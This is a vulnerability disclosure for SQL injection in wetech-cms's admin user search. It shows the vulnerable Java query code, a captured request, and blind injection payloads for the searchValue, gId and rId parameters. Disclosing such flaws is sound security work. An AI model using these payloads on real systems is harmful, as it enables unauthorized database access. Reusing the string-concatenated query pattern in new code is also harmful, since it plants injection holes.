---
typora-root-url: ./img
---

**BUG_Author:**

hadagaga

**Vendor:**

https://github.com/cjbi/wetech-cms

**Software:**

https://github.com/cjbi/wetech-cms

**Vulnerability File:**

#### wetech-cms-master\wetech-core\src\main\java\tech\wetech\cms\dao\UserDao.java

```java
	@Override
	public Pager<User> findUser(String gId, String rId, String searchCode, String searchValue) {
		String hql = "from User u where 1=1";
		if (StringUtils.isNotBlank(searchCode) && StringUtils.isNotBlank(searchValue)) {
			if ("id".equals(searchCode)) {
				hql += " and u.id like '%" + searchValue + "%'";
			} else if ("username".equals(searchCode)) {
				hql += " and u.username like '%" + searchValue + "%'";
			} else if ("nickname".equals(searchCode)) {
				hql += " and u.nickname like '%" + searchValue + "%'";
			}
		}
		if (gId != null && !"".equals(gId)) {
			hql += "and u.id in (select ug.user.id from UserGroup ug where ug.group.id=" + gId + ")";
		}
		if (rId != null && !"".equals(rId)) {
			hql += "and u.id in (select ur.user.id from UserRole ur where ur.role.id=" + rId + ")";
		}
		
		return this.find(hql);
	}
```

​	Analyzing the code, I found that there are multiple parameters there with dynamic splicing.
​	From the SQL statement, we can see that there are three variables that use dynamic concatenation: searchValue, gId, and rId
​	Let's head to the front-end positioning function point. It was discovered that this is a user management feature in the admin console.

![image-20241128212129276](/image-20241128212129276.png)

​	According to the function point, we come to the user-managed search function, try to search and capture the packet, and the following packets are captured:

```http
GET /admin/user/list.do?draw=2&columns%5B0%5D%5Bdata%5D=id&columns%5B0%5D%5Bname%5D=&columns%5B0%5D%5Bsearchable%5D=true&columns%5B0%5D%5Borderable%5D=false&columns%5B0%5D%5Bsearch%5D%5Bvalue%5D=&columns%5B0%5D%5Bsearch%5D%5Bregex%5D=false&columns%5B1%5D%5Bdata%5D=id&columns%5B1%5D%5Bname%5D=&columns%5B1%5D%5Bsearchable%5D=true&columns%5B1%5D%5Borderable%5D=false&columns%5B1%5D%5Bsearch%5D%5Bvalue%5D=&columns%5B1%5D%5Bsearch%5D%5Bregex%5D=false&columns%5B2%5D%5Bdata%5D=username&columns%5B2%5D%5Bname%5D=&columns%5B2%5D%5Bsearchable%5D=true&columns%5B2%5D%5Borderable%5D=false&columns%5B2%5D%5Bsearch%5D%5Bvalue%5D=&columns%5B2%5D%5Bsearch%5D%5Bregex%5D=false&columns%5B3%5D%5Bdata%5D=nickname&columns%5B3%5D%5Bname%5D=&columns%5B3%5D%5Bsearchable%5D=true&columns%5B3%5D%5Borderable%5D=false&columns%5B3%5D%5Bsearch%5D%5Bvalue%5D=&columns%5B3%5D%5Bsearch%5D%5Bregex%5D=false&columns%5B4%5D%5Bdata%5D=status&columns%5B4%5D%5Bname%5D=&columns%5B4%5D%5Bsearchable%5D=true&columns%5B4%5D%5Borderable%5D=false&columns%5B4%5D%5Bsearch%5D%5Bvalue%5D=&columns%5B4%5D%5Bsearch%5D%5Bregex%5D=false&columns%5B5%5D%5Bdata%5D=email&columns%5B5%5D%5Bname%5D=&columns%5B5%5D%5Bsearchable%5D=true&columns%5B5%5D%5Borderable%5D=false&columns%5B5%5D%5Bsearch%5D%5Bvalue%5D=&columns%5B5%5D%5Bsearch%5D%5Bregex%5D=false&columns%5B6%5D%5Bdata%5D=phone&columns%5B6%5D%5Bname%5D=&columns%5B6%5D%5Bsearchable%5D=true&columns%5B6%5D%5Borderable%5D=false&columns%5B6%5D%5Bsearch%5D%5Bvalue%5D=&columns%5B6%5D%5Bsearch%5D%5Bregex%5D=false&columns%5B7%5D%5Bdata%5D=createDate&columns%5B7%5D%5Bname%5D=&columns%5B7%5D%5Bsearchable%5D=true&columns%5B7%5D%5Borderable%5D=false&columns%5B7%5D%5Bsearch%5D%5Bvalue%5D=&columns%5B7%5D%5Bsearch%5D%5Bregex%5D=false&start=0&length=15&search%5Bvalue%5D=&search%5Bregex%5D=false&searchCode=id&searchValue=&_=1732691822696 HTTP/1.1
Host: 172.21.55.165:8888
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0
Accept: application/json, text/javascript, */*; q=0.01
X-Requested-With: XMLHttpRequest
Referer: http://172.21.55.165:8888/admin
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
Cookie: JSESSIONID=5EA494FF429C210478C61A1E2BA26079; collapase-nav=collapse-nav
Connection: close
```

​	The searchValue in the GET parameter is the injection point, try to enter single quotation marks, report an error, try to construct an SQL statement, and get payload:

```sql
1' and id like (case when ascii(substr(database(),1,1))=1 then '1' else '%' end) and id like '
```

​	The injection method is the same as the previous SQL injection method.

###### gId、rId

​	Add a gId or rId to the GET parameters, and the payload is as follows:

```sql
2 and id like (case when ascii(substr(database(),1,1))=1 then '1' else '%' end) 
```
